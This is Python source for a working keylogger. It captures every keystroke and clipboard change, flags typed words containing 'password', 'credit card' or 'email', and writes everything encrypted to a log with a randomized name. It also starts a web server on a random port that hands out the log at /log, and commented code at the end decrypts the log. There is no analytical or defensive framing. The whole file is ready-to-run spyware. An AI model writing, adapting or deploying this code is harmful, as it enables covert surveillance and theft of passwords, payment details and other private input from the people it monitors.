import pynput
import pyperclip
from cryptography.fernet import Fernet
import threading
import http.server
import socketserver
import time
import random

# Randomized log file name (e.g., sys1234.dat)
LOG_FILE = f"sys{random.randint(1000, 9999)}.dat"
# Randomized port for web server (e.g., 54321)
PORT = random.randint(10000, 65535)
# Sensitive keywords
SENSITIVE_KEYWORDS = ['password', 'credit card', 'email','Password', 'Credit Card', 'Email']
# Fernet key Generator
# key = Fernet.generate_key()
# print(f"Generated Key: {key.decode()}")
KEY = b'Key_Here'
CIPHER = Fernet(KEY)

# --- Global Variables ---
current_word = ''

# --- Keystroke Logging ---
def on_press(key):
    global current_word
    try:
        char = getattr(key, 'char', None)
        if char:
            current_word += char
            encrypted_key = CIPHER.encrypt(char.encode())
            with open(LOG_FILE, 'ab') as f:
                f.write(encrypted_key + b'\n')
            if any(keyword in current_word for keyword in SENSITIVE_KEYWORDS):
                with open(LOG_FILE, 'ab') as f:
                    f.write(CIPHER.encrypt(f"SENSITIVE: {current_word}".encode()) + b'\n')
        else:
            current_word = ''  # Reset on special keys
    except Exception:
        pass

# --- Clipboard Monitoring ---
def monitor_clipboard():
    last_clipboard = ''
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                encrypted_clipboard = CIPHER.encrypt(f"CLIPBOARD: {current_clipboard}".encode())
                with open(LOG_FILE, 'ab') as f:
                    f.write(encrypted_clipboard + b'\n')
            time.sleep(1)
        except Exception:
            time.sleep(1)

# --- Web Server Handler ---
class LogHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/log':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            with open(LOG_FILE, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

# --- Web Server ---
def start_server():
    handler = LogHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"Server running on port {PORT}")
        httpd.serve_forever()

# --- Main Execution ---
if __name__ == "__main__":

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    listener.join()

# Decoding The File
#from cryptography.fernet import Fernet
#key = b'Key_HERE'
#cipher = Fernet(key)
#with open('log', 'rb') as f:  # Replace with your log file name
    #lines = f.readlines()
    #for line in lines:
        #print(cipher.decrypt(line).decode())
